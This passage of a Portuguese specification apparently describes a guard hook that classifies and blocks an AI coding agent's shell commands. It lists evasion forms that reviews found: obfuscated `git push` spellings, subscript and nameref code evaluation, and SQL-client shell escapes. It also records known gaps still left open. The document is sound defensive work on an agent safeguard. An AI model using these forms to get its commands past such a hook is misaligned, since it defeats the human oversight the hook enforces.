**Testes.** `ReviewFixD1`: `test_m1_alias_values_are_split_and_dequoted_like_git_does`, `test_m1_both_forms_of_git_config_parameters_are_read`; `LevelBReasonsD1`.

**Nota.** A28, V4 estende esta regra: os operandos `NOME=valor` de `env` e `sudo` também alimentam a configuração do git.

### A18 - Brace expansion no nome de programa: elementos entre aspas e nível B (M2; revisa A6, regra 2)

**Motivo.** `{'git',push}`, `""{git,push}` e `{git,$'\x70ush'}` rodam `git push` no bash. A6 tratava qualquer parte entre aspas como irresolúvel e deixava a cabeça irresolúvel do texto de cima em nível A, que é só registro.

**Regras** (substituem A6, regra 2):

1. Partes entre aspas (`'...'`, `"..."` sem expansão, `$'...'` decodificado com certeza) são texto: a brace expansion roda antes da remoção das aspas, então as chaves e vírgulas delas não são da expansão (`{'a,b',c}` dá `a,b` e `c`; `{'{a}',b}` dá `{a}` e `b`). Uma lista simples de vírgulas, até 16 palavras, é resolvida como antes (`_brace_words`).
2. Brace expansion no nome de programa que não se resolve (intervalo `{1..3}`, `x{a..c}`; elemento com expansão `{$X,y}`, `{a,$(c)}`; expansão junto `{a,b}$X`, `${X}{a,b}`; mais de 16 palavras ou de 256 caracteres) é nível B (`dynamic_code`) em qualquer lugar, inclusive no nome de programa de cima (antes nível A ali). `echo {a,b}`, `ls {a,"b"}` e `'{git,push}'` não são dinâmicos.

**Testes.** `ReviewFixD1`: `test_m2_quoted_and_decoded_elements_of_a_brace_head_are_resolved`, `test_m2_a_brace_head_that_cannot_be_resolved_is_level_b`; `ReviewFixB1.test_a_brace_expansion_at_the_head_that_cannot_be_resolved_is_level_b` (renomeado de `..._is_n6` e revisado: era nível A fora de string de código); `LevelBReasonsD1`.

### A19 - Contextos de subscrito e fontes de marca (M3; estende A8, regra 3)

**Motivo.** `x='a[$(cmd)]'; echo ${!x}`, `[[ -v $x ]]` e o `${(P)x}` do zsh avaliam o subscrito e rodam `cmd` sem sintaxe aritmética. O texto também chegava por um valor conhecido (`d=$; x="a[${d}(c)]"`) e por `read` de here-string ou heredoc, fontes que a marca não via.

**Regras.**

1. **Contextos novos** que avaliam o subscrito de um nome marcado (ou do texto entre aspas): indireção `${!x}`, `${!x:-d}`, `${(P)x}`, `${(PU)x}` (não `${!x[@]}`, que é a lista de chaves); o operando de `-v` (e `-R`) em `[[ ]]`, `[` e `test`. Somam-se aos contextos aritméticos de A8.
2. **Fontes novas de marca**: um valor conhecido que, com os nomes nele trocados pelos valores, contém `$(` ou crase (`_known_taint`; `$((` não conta); e `read`, `mapfile` e `readarray` alimentados por heredoc ou here-string com `$(` ou crase, marcando os nomes lidos (ou `REPLY`/`MAPFILE`), também através de outros nomes (`read x <<< '...'; y=$x`).
3. **Continuam fora**: `x=a; echo ${!x}`, `[[ -v HOME ]]`, `x='a[$(c)]'; echo $x`, `read -r x <<< 'a[$(c)]'; echo $x`, contadores (`n=$((n+1)); (( n ))`).

A docstring de `_code_evaluation` foi reescrita com a regra de alcance (decisão de B1b), e um teste trava o texto.

**Testes.** `ReviewFixD1`: `test_m3_indirection_and_v_test_are_subscript_contexts`, `test_m3_taint_comes_from_known_values_and_from_read_with_a_substitution_in_its_input`, `test_the_code_evaluation_docstring_describes_the_reach_rule`; `LevelBReasonsD1`.

**Nota.** A28, V2 estende a regra 2: um nameref (`declare`/`typeset`/`local -n r=x`) para um nome marcado também é marcado.

### A20 - Escapes dos clientes SQL (M4; estende A10, regra 6)

**Motivo.** Formas em que o cliente roda um programa escapavam da lista de A10: crase num meta-comando do psql (``\set x `cmd` ``), o editor (`\e`, `\ef`, `\ev`, que `\setenv PSQL_EDITOR` aponta para qualquer programa), `\g (format=csv) |cmd`, `\o '|cmd'`, `COPY ... PROGRAM`, a função `edit(` do sqlite3 e os prefixos de dot-command (`.syste`, `.sys`, `.she`).

**Regra** (`_query_escape` reescrito; nível B `dynamic_code`; vale para corpo, here-string e argumentos de todos os cinco clientes; sobre-aproximado):

| Cliente | Formas que rodam um programa |
|---|---|
| sqlite3 | `.shell` e `.system` e qualquer prefixo deles a partir de `.she`/`.sys`; `\|` em qualquer dot-command (`.once \|cmd`, `.read \|cmd`); a função `edit(` (palavra inteira, brancos antes do parêntese permitidos, sem distinguir caixa) |
| psql | `\!`, `\e`, `\ef`, `\ev`, `\setenv`; crase numa linha de meta-comando; `\g`, `\gx`, `\o`, `\w` e o meta-comando de pipe com um pipe depois deles na linha (`\g (format=csv) \|cmd`, `\o '\|cmd'`); `COPY ... PROGRAM` (sem distinguir caixa, também em linhas separadas) |
| mysql, mariadb | `system`, `pager` e `edit` no início da linha; `\!` |

Não são escape: `select 1;`, `select credit(1);`, `\g` sem `|`, `\g out.txt`, `\o out.txt`, `\gexec`, `\echo hi`, `\d t`, `.tables`, `.mode csv`, `.s`, `.sh`, um `||` do SQL antes do meta-comando, `sqlite3 db 'select 1'`.

**Testes.** `ReviewFixD1.test_m4_the_escapes_of_the_sql_clients_are_level_b_in_bodies_and_arguments` (cada corpo com os cinco clientes, e os argumentos de `psql -c` e do `sqlite3` posicional); `LevelBReasonsD1`. `ReviewFixB2.test_a_plain_query_argument_is_not_an_escape` continua.

**Nota.** A28 revisa a linha do sqlite3: `edit` como palavra, em qualquer grafia SQL (V3), e os prefixos de dot-command a partir de `.sy` (V5). Onde divergir, vale A28.

### A21 - Menores: canário sobre palavras decodificadas, lançadores e `\cX` (L1 e menores; estende A5, A10 e A12)

1. **Canário** (A12): lê, além do texto cru de cada comando simples, as palavras como o shell as vê (aspas removidas, `$'...'` decodificado). `strace -f git $'\x70ush'`, `unshare git pu''sh`, `bundle exec git $'\x70ush'`, `direnv exec . git $'\x70ush'` e `watch -n1 git pu''sh` dão o achado ou `deny_token_unmatched`.
2. **Lançadores** (A10, regra 5): `hatch env run [-e ENV] [--] CMD` (segunda palavra de subcomando antes do programa, com os flags de `env run`; também atrás de `hatch -v`); `uv run -p`/`--python` com valor, junto ou separado (`-p3.12`); `mamba run` e `micromamba run` com a gramática do `conda`; `pixi run` (flags globais, `-e`/`--environment`, `--manifest-path`). Sem `run`, o lançador é o comando (`hatch env show`, `mamba install x`). Os novos entram em `KNOWN_HEADS`.
3. **`\cX` em `$'...'`** (A5): decodificado como no bash, `toupper(X) & 0x1f`, e `\c?` é DEL (0x7f). Resultado NUL (`\c@`) ou `\c` seguido de branco não decodifica com certeza (`Part.dyn`). `$'\c$ocker'` é `\x04ocker`, outro programa, não `docker`.

**Testes.** `ReviewFixD1`: `test_l1_the_canary_also_reads_the_decoded_words`, `test_l1_hatch_env_run_is_a_launcher`, `test_minor_uv_run_dash_p_and_the_conda_family_and_pixi`, `test_minor_ansi_c_control_characters_follow_bash`.

### A22 - Marca e valores lineares (L2; seção 7, P1)

**Motivo.** Uma cadeia de nomes (`a1=$a0; a2=$a1; ...`) fazia a marca de A8 e a consulta de valores por posição crescerem de forma superlinear: falhava fechado pelo orçamento, mas acima de P1 (cadeia de 1.500 elos: 1,72 s de CPU).

**Regra.** `_tainted_names` faz uma passada só, com lista de trabalho (cada nome entra uma vez, qualquer que seja a ordem das atribuições), e os valores por posição (`_Values.at`) são indexados. A cadeia de 1.500 elos leva 0,39 s de CPU; o teste fixa menos de 1 s para 1.200 elos, com e sem marca.

**Testes.** `ReviewFixD1.test_l2_a_long_chain_of_names_is_linear` (inclui a ordem invertida das atribuições).

### A23 - PS4 só nas palavras de shell (estende A8, regra 1)

**Motivo.** Falso positivo: `python3 -c 'PS4=x; print("-xc")'` era negado, porque a regra lia o texto cru.

**Regra** (`_ps4_traced`). `PS4` e a evidência de tracing são procurados só nas palavras de shell do texto: as atribuições e as palavras de cada comando simples, cortadas depois do nome de um intérprete de outra linguagem ou cliente SQL (os argumentos dele são texto daquela linguagem). Corpos de heredoc não contam (`cat > f.sh <<'EOF'` com `PS4` e `set -x` no corpo, ou um corpo Python, passam). A sobre-aproximação de A8 continua dentro do shell: `PS4='$(x)'; python3 -c 'x'; set -o xtrace`, `env PS4='$(x)' bash -x s` e o texto de um `bash -c` aninhado continuam nível B.

**Testes.** `ReviewFixD1.test_ps4_is_read_in_shell_words_only`; `CodeEvaluationContexts` (A8) continua.

### A24 - Funções que repassam argumentos (decisão do usuário; revisa A10, regra 4)

**Motivo.** A10 deixava em nível B a definição de uma função com nome de programa feito de expansão (`f() { "$@"; }`), então auxiliares comuns (`retry`, `run`, `c() { curl ... "$@"; }`) eram negados mesmo com chamadas literais. Decisão do usuário: nível B só quando uma chamada não se resolve (argumentos dinâmicos, função passada a `xargs`/`eval`, cadeias de funções, mais de 16 chamadas); a definição sozinha passa.

**Regras** (substituem A10, regra 4):

1. **Corpo**: numa função do texto que usa parâmetros posicionais, cada palavra que só expande parâmetros posicionais vira uma palavra neutra (`ARG`); o resto do corpo é classificado como sempre (`f() { git push "$@"; }` dá `git_push`; `f() { "$@"; $1$X; }` e `f() { "$1$X"; }` continuam nível B). A definição sozinha não é achado.
2. **Chamada**: cada chamada (nome literal numa posição de comando, também atrás de wrapper, `timeout 5 f ls`, ou por valor conhecido, `X=f; $X ...`) é classificada como string de código, com o corpo em que `$@`, `$*` e `$N` viram os argumentos da chamada, como em A10 (um nível; `$@` sem aspas divide as palavras). Os argumentos entram como escritos, então uma expansão que cai na posição de programa ou de verbo de `git`/`docker` é nível B (`f $X`, `f "$X" a`, `f $(cmd)`, `g() { git "$@"; }; g $X`, `f() { sudo "$@"; }; f $X restart y`); como argumento comum, não (`f ls "$HOME"`, `f ls $(date)`, `c http://localhost:9/a -o $D/f`).
3. **Nível B**: a função nomeada fora de uma posição de chamada por um programa que a roda depois (`xargs f`, `eval f ls`, `watch f ls`, `find -exec f`), salvo programas que só imprimem ou inspecionam o nome (`echo`, `type`, `which`, `unset`, ...) e os programas classificados (`run() { ...; }; docker run x`); a função nomeada numa string de shell aninhada (`bash -c 'f ls'`, com ou sem `export -f`); uma função que repassa chamada de dentro de outra (ou dela mesma); mais de 16 chamadas (`analysis_budget`). Os outros casos usam `dynamic_code`.

**Divergência registrada.** A decisão do usuário fala em "argumentos dinâmicos"; a implementação é mais estreita: só a expansão que chega à posição de programa ou de verbo é nível B, porque ler qualquer argumento dinâmico como nível B negaria auxiliares como `c() { curl ... "$@"; }; c http://x -o $D/f`. Segue o princípio: nenhuma forma bloqueada é liberada, porque o corpo com os argumentos é classificado inteiro.

**Testes.** `ReviewFixD1`: `test_a_forwarding_function_that_is_only_defined_passes`, `test_a_forwarding_function_call_is_classified_with_its_arguments`, `test_a_forwarding_function_call_that_cannot_be_resolved_is_level_b`, `test_a_forwarding_function_body_still_classifies_what_is_literal_in_it`; `ReviewFixB2.test_a_function_that_forwards_is_level_b_only_when_a_call_cannot_be_resolved` (renomeado de `..._whatever_the_call_is` e revisado); `LevelBReasonsD1`. Os outros testes de A10, regra 4, continuam.

**Nota.** A28, V1 revisa as regras 1 e 2: as formas posicionais além de `$@`, `$*` e `$N` (fatias, `shift`, `$argv` do zsh) são modeladas, e uma forma não modelada torna a chamada nível B.

### A25 - Carregador com `.pyc` de hash conferido e `BaseException` no import (D2, Pergunta 9; revisa A13)

**Motivo.** Pergunta 9, opção (a): o cache validado por `mtime` e tamanho podia servir bytecode velho depois de uma edição do mesmo tamanho no mesmo segundo, e um `.pyc` editado ou plantado era usado. A segunda revisão achou também que `_load_module` deixava passar um `BaseException` (`SystemExit`, `KeyboardInterrupt`) levantado por um módulo no import.

**Regras** (substituem a descrição do carregador em A13; `_load_classifier`, `_classifier()` e a falha fechada continuam):

1. `_load_module` usa uma subclasse de `SourceFileLoader` cujo `get_code` lê o fonte, calcula `_imp.source_hash` e usa o `.pyc` de `__pycache__` só quando o cabeçalho traz a flag de hash conferido ([PEP 552](https://peps.python.org/pep-0552/), flags `0b11`) e o hash do fonte recém-lido. Senão compila o fonte e grava um `.pyc` de hash conferido de forma atômica (`set_data`), ignorando erro de escrita (diretório só de leitura) e respeitando `-B` (`sys.dont_write_bytecode`). `.pyc` por timestamp, com hash errado, sem conferência ou corrompidos não são usados e são reescritos.
2. O carregador captura `BaseException` no import e em todo o carregamento: o módulo sai de `sys.modules` e fica só o nome do erro (`SystemExit`, `KeyboardInterrupt`); todo Bash é negado com `classifier_error`, e as escritas de arquivo continuam conferidas.
3. Suposição (log, D2): um `.pyc` com o hash certo do fonte atual é confiável.

O hash custa cerca de 0,08 ms (parte C). Pela Pergunta 13, opção (b), só o orçamento do processo vale: 71,7 ms depois de D2 contra 88,1 ms de `eee112a`.

**Testes.** P-SL4 (`ShellParserProcess`, `test_hook_process.py`): `test_p_sl4_the_modules_are_cached_as_bytecode_and_give_the_same_decision` (cabeçalhos de hash conferido), `test_p_sl4_a_same_size_edit_with_the_same_mtime_is_not_served_from_the_cache`, `test_p_sl4_a_planted_bytecode_is_not_used` (timestamp, hash errado, sem conferência, lixo; o cache é reparado), `test_p_sl4_a_module_that_exits_at_import_denies_bash_and_the_hook_still_decides` (`SystemExit`, `KeyboardInterrupt`). UN16 continua.

### A26 - BIO11 sem `typing` (Pergunta 8; revisa A4)

`ShellModuleInvariant.ALLOWED_IMPORTS` (`test_bounded_io.py`) passa a `{"re", "__future__"}`, e os casos ruins ganham `import typing` e `from typing import NamedTuple`. A restrição de A4 e de P2 fica verificável no parser; o classificador já era coberto por BIO12. A linha BIO11 da Testing foi corrigida no lugar; a frase de A4 "BIO11 continua como está" deixou de valer.

### A27 - Testes no nível do hook para as formas de A5 (Pergunta 10)

`ParserFormsAtTheHookLevel` (`test_classify.py`, 7 testes por `analyze_command`, todos passando): `test_decoded_ansi_c_heads_and_verbs`, `test_a_process_substitution_inside_a_word_or_a_conditional_is_a_nested_script`, `test_zsh_expansions_at_the_head_are_level_b`, `test_repeat_with_a_brace_body_is_rejected_and_the_wrapper_form_is_read`, `test_a_pending_heredoc_is_read_at_the_newline_inside_a_conditional_or_an_array`, `test_a_heredoc_delimiter_written_with_an_ansi_c_escape_closes_the_body`, `test_forms_that_evaluate_text_as_code_are_level_b`. A Pergunta 10 previa `test_command_positions.py`; a classe ficou em `test_classify.py` (log, D2), com a mesma cobertura.

### A28 - Variantes da verificação estreita (parte E)

**Motivo.** A verificação de segurança estreita (log, "Narrow security verification"; nenhuma sonda executada) confirmou H1-H4, M2, L1, L2, os majors 1-3, o PS4 e o carregador, e achou variantes ainda silenciosas dos mesmos truques: V1 (alto) a V5. **Decisão do usuário**: uma mini-rodada só para V1-V5 (uma forma posicional não modelada torna a chamada nível B), provada por testes e replay, sem nova revisão. O detalhe fica no log, bloco "Fix part E". Nenhum motivo novo: tudo usa `dynamic_code`.

| V | Revisa | Regra | Testes (`ReviewFixE`, `test_command_positions.py`) |
|---|---|---|---|
| V1 | A24, regras 1 e 2 | `_positional` devolve o que a palavra significa: todos, argumento N, fatia `("slice", N, M)` ou não modelada. `${@:N[:M]}`, `${*:N[:M]}`, `$argv`, `${argv[@]}`, `$argv[i]` do zsh e `shift [n]` em linha reta (`_positional_model`) são substituídos pelos argumentos da chamada; um parâmetro usado antes do `shift` mantém o valor antigo (`run() { echo "### $1"; shift; "$@"; }`). Formas não modeladas (`${@:$n}`, `${1:-x}`, `${!1}`, `$@[i]`, `${@[i]}`, `set --`, `shift` dentro de `if`, laço, `&&` ou pipeline, ou com argumento não numérico) tornam a chamada nível B; a definição sozinha continua passando | `test_v1_slices_shift_and_argv_are_substituted_with_their_real_meaning`, `test_v1_a_body_that_uses_the_parameters_in_a_way_that_is_not_modeled_is_level_b`, `test_v1_the_positional_forms_and_the_model` |
| V2 | estende A19, regra 2 | `declare`/`typeset`/`local -n r=x` marca `r` quando `x` está marcado, também em cadeia (`declare -n s=r`); valem os contextos de A8 e A19 (`(( r ))`, `$(( r + 1 ))`, `let`, teste numérico, `${!r}`). `x=1`, um nameref para outro nome e `echo $r` continuam fora | `test_v2_a_nameref_to_a_tainted_name_is_tainted` |
| V3 | A20 (linha do sqlite3) | qualquer palavra `edit`, sem distinguir caixa e em qualquer grafia SQL (`"edit"(`, `[edit](`, `` `edit`( ``, `edit/**/(`, `main."edit"(`, comentário ou quebra antes do parêntese), é nível B em corpos, here-strings e argumentos SQL; `credit`, `reedit`, `editor` e `edits` passam | `test_v3_edit_is_found_whatever_the_sql_spelling` |
| V4 | estende A17 | os operandos `NOME=valor` de `env` (também depois de `-u X` e `-i`) e de `sudo` antes do programa alimentam a configuração do git (`GIT_CONFIG_PARAMETERS`, `GIT_CONFIG_COUNT`/`KEY_n`/`VALUE_n`) como atribuições de prefixo; um operando cujo nome vem de expansão, um valor com expansão ou um item que não analisa é nível B. `doas` fica fora (não está na tabela de wrappers, decisão 5) | `test_v4_env_and_sudo_operands_feed_the_git_configuration` |
| V5 | A20 (linha do sqlite3) | os prefixos de dot-command de `.system` a partir de 2 letras (`.sy`) e de `.shell` a partir de 3 (`.she`), sem distinguir caixa, são nível B no corpo e no argumento; `.s`, `.sh`, `.st`, `.schema`, `.sha3sum`, `.stats` passam | `test_v5_sqlite_dot_command_prefixes` |

**Resultado medido** (log, "Fix part E"): suite 811 OK (10,7 s); replay de 14.281 comandos: E1 244 / 190 (nenhum comando muda), E2 114 / 71 (3 escritas de arquivo das sondas da revisão passam a ser permitidas), E3 46 / 23 (nenhum comando novo), E4 0; `analyze_command` mediana 0,373 ms, p99 2,37 ms. Gate final: 811 testes, 3 execuções verdes, 9,9-11 s.

**Fica fora** (backlog): `env $N=x GIT_CONFIG_PARAMETERS=... git p` para a leitura do wrapper na palavra dinâmica (só nível A); `doas` não é wrapper.

### A29 - Orçamento da suite revisado (Task 7)

**Decisão do usuário** (2026-11-14): o orçamento da Task 7, de 8,5 s, foi fixado para 655 testes; para os 811 testes atuais ele passa a ser **12 s** de parede. As rodadas de revisão acrescentaram 156 testes; o gate final mediu 9,9-11,0 s em 3 execuções, com carga de 1,5 a 2,9; a maior parte do tempo são os cerca de 140 processos do hook que os testes abrem. A Task 7 fecha com este orçamento; os demais critérios dela (nenhum teste acima de 0,5 s, três execuções verdes, sementes fixas, nenhuma asserção enfraquecida, o hook sem mudança) não mudam. Reduzir o tempo continua na entrada [hooks tests suite slow](../../backlog/refactor/2026-11-13-hooks-tests-suite-slow.md).

**Entrada encerrada pelo usuário**: [audit hook launcher performance](../../backlog/refactor/2026-11-13-audit-hook-launcher-performance.md), superada pela parte C (A13 e A25: o classificador em módulo com bytecode em cache, `.pyc` com hash conferido; mediana do processo do hook cerca de 70 ms, contra cerca de 88 ms em `eee112a`).

### Perguntas 7-13 (decididas)

- **Pergunta 7** (Adendo 2026-11-14): aplicada como opção (a) na Task 3 (log, Task 3). Uma função só de subcomando (`_git_has_subcommand`/`_is_git_commit`) serve a classificação (A2), a decisão de dado de `git ... -F -` e o valor de mensagem `$(cat <<EOF)` (H3). Os testes ficaram em `GitSubcommand` (`test_command_positions.py`) e GC1, não em `StdinFileSinkLimits` como a opção previa.
- **Perguntas 8-13** (Adendo 2026-11-14 (2)): decididas pelo usuário em 2026-11-14 (log, "User decisions (2026-11-14, closing)"), todas como recomendado.

| # | Escolha | Onde ficou |
|---|---|---|
| 8 | (a) tirar `typing` de BIO11 | A26 |
| 9 | (a) `.pyc` com hash conferido no carregador | A25 |
| 10 | (a) testes no nível do hook para as formas de A5 | A27 |
| 11 | (a) suposições confirmadas como estão: `[`/`test` numéricos como `[[ ]]`; `awk '{a[$(NF)]}'` e programas parecidos não negados; a lista de leitores de dado da here-string; `uv run python -m pytest` como `test-full` | A8, A10 (sem mudança de código) |
| 12 | (a) `cd x && BIN=$(...); $BIN` continua nível B | A7 (sem mudança de código) |
| 13 | (b) só o orçamento do processo vale para os dois módulos; nenhuma linha nova na seção 7 | A13, A25 |

Nenhuma pergunta aberta resta nesta spec.

### Fora do escopo (backlog)

Lacunas que o log registra como não modeladas ou fora do escopo desta rodada. Vão ao backlog pelo `backlog-keeper` (esta spec não edita o backlog), e a verificação final não as reabre:

- grupo ou subshell que lê um pipe: `echo 'git push' | { bash; }` (log, B2; A10, "Fica fora");
- `!cmd` do `dc` (B2);
- executores de configuração do git: `core.sshCommand`, `core.pager`, `core.editor`, `core.fsmonitor` (B2), mais `credential.helper` e `diff.external` (verificação estreita);
- `env:cmd` do hatch (B2; `hatch env run` entrou em A21);
- `${!x[@]}` com `x` marcado: sobre-aproximado como `dynamic_code` (falso positivo possível, não falha aberta; log, D1);
- `.pyc` de hash conferido plantado com o hash do fonte atual é servido: o PEP 552 confere se o cache está velho, não a integridade (bug de autoproteção; suposição de A25, regra 3; verificação estreita);
- `pixi exec` (verificação estreita) e `doas` como wrapper (fora da tabela de wrappers, decisão 5; parte E);
- aliases com o mesmo texto do comando, não verificados sob o `eval` do zsh do Claude Code (verificação estreita);
- `env $N=x GIT_CONFIG_PARAMETERS=... git p`: a leitura do wrapper para na palavra dinâmica, só nível A (parte E).
